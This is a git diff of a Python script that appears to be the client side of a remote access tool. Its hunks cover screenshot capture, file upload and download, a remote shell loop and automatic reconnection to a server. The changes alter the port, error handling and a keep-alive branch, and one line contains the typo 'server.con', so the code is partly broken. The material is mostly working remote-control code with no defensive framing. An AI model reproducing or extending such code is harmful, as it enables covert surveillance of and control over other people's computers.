@@ -7,7 +7,7 @@ import mss
 
 
 
-address = ("0.0.0.0", 55000)
+address = ("0.0.0.0", 5000)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -20,7 +20,7 @@ def take_screen_shot():
 def recv(buff_size=1024):
     data_size = int(server_con.recv(12).decode())
     if not data_size:
-        return
+        return b''
 
     data = bytes()
     while len(data) < data_size:
@@ -39,15 +39,17 @@ def upload_file(file_name):
         with open(file_name, "rb") as file:
             file_data = file.read()
             send(file_data)
-
     except:
         print("Error opening file")
+        send(b'')
 
-def download_file(file_name, file_path=os.getcwd()):
+def download_file(file_name, file_path):
+    print(os.getcwd())
     file_data = recv()
     if not file_data:
+        print("Could not download file...")
         return
-    print(file_path)
+
     file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
     file.write(file_data)
     file.close()
@@ -77,7 +79,8 @@ def open_shell():
 
         elif data.decode()[:2] == "up":
             file_name = data.decode()[3:]
-            download_file(file_name)
+            print(os.getcwd())
+            download_file(file_name=file_name, file_path=os.getcwd())
             print(f"Downloading File...{file_name}")
             continue
 
@@ -119,9 +122,14 @@ def main():
         elif choice == "3":
             pass
         elif choice == "4":
-            server_con.close()
-            time.sleep(5)
-            establish_connection(address)
+            keep_alive = recv().decode()
+            if keep_alive.lower() == "y" or keep_alive.lower() == "yes":
+                server.con.shutdown(socket.SHUT_WR)
+                server_con.close()
+                time.sleep(5)
+                establish_connection(address)
+            else:
+                break
 
     server_con.close()
 
